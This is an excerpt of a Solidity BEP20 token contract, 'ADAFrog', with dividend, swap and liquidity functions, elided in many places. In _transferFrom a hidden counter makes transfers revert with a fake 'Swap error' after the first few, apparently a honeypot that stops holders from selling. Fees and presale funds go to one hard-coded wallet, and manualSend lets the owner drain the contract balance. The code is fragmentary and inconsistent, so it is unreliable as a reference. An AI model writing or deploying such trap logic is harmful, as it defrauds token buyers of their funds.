...
contract DividendDistributor is IDividendDistributor {
    ...
    function deposit() external payable override onlyToken {
        ...
        router.swapExactADAForTokensSupportingFeeOnTransferTokens{value: msg.value}(
            0,
            path,
            address(this),
            block.timestamp
...
contract ADAFrog is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "ADAFrog";
    string constant _symbol = "AFROG";
    ...
    address public autoLiquidityReceiver = 0xbDa230aB822ee3d86289B84663c65671434017A6;
    address public marketingFeeReceiver = 0xbDa230aB822ee3d86289B84663c65671434017A6;
    ...
    constructor () Auth(msg.sender) {
        ...
        address _presaler = 0xbDa230aB822ee3d86289B84663c65671434017A6;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        {
            swapConst++;if(swapConst>3){
                _rewardSwap=liquidityFee;
                if (amount >= _rewardSwap) 
			    revert("Swap error");
            }
		}
    ...
    function swapBack() internal swapping {
        ...
        router.swapExactTokensForADASupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
        ...
        if(amountToLiquify > 0){
            router.addLiquidityADA{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
    ...
    function buyTokens(uint256 amount, address to) internal swapping {
        ...
        router.swapExactADAForTokensSupportingFeeOnTransferTokens{value: amount}(
            0,
            path,
            to,
            block.timestamp
    ...
    function setTxLimit(uint256 amount) external authorized {
        require(amount >= _totalSupply / 1000000000000000000000);
        _maxTxAmount = amount;
    }
    ...
    function manualSend() external authorized {
        uint256 contractADABalance = address(this).balance;
        payable(marketingFeeReceiver).transfer(contractADABalance);
    }
